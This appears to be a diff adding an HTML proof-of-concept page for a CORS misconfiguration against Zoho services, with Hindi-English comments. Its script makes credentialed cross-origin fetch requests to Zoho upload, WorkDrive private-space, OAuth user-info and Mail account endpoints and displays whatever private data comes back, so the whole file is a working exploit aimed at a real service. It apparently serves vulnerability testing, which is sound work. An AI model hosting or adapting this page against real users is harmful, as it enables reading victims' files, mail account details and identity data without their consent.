@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CORS PoC - Real Data Fetch</title>
+</head>
+<body>
+  <h2>CORS Real Impact PoC</h2>
+  <p>Pehle Zoho mein login karo, phir test karo</p>
+  <button onclick="runAll()">Run All Tests</button>
+  <pre id="output" style="background:#111;color:#0f0;padding:10px;"></pre>
+
+<script>
+const out = document.getElementById('output');
+
+function log(msg) {
+  out.textContent += msg + "\n";
+}
+
+async function fetchEndpoint(label, url, options = {}) {
+  log("\n=== " + label + " ===");
+  log("URL: " + url);
+  try {
+    const res = await fetch(url, {
+      credentials: "include",
+      ...options
+    });
+    log("Status: " + res.status);
+    const text = await res.text();
+    log("Response (500 chars):\n" + text.substring(0, 500));
+  } catch(e) {
+    log("Error: " + e.message);
+  }
+}
+
+async function runAll() {
+  out.textContent = "Testing shuru...\n";
+
+  // 1. Upload endpoint - user info
+  await fetchEndpoint(
+    "Upload Endpoint - User Info",
+    "https://upload-accl.zoho.com/upload"
+  );
+
+  // 2. WorkDrive files
+  await fetchEndpoint(
+    "WorkDrive - File List",
+    "https://workdrive.zoho.com/api/v1/privatespace"
+  );
+
+  // 3. Accounts - current user
+  await fetchEndpoint(
+    "Accounts - Current User",
+    "https://accounts.zoho.com/oauth/user/info"
+  );
+
+  // 4. Mail user info
+  await fetchEndpoint(
+    "Mail - User Info",
+    "https://mail.zoho.com/api/accounts"
+  );
+
+  log("\n=== DONE ===");
+  log("Agar kisi bhi endpoint mein actual data aaya,");
+  log("toh CORS impact confirmed hai.");
+}
+</script>
+</body>
+</html>
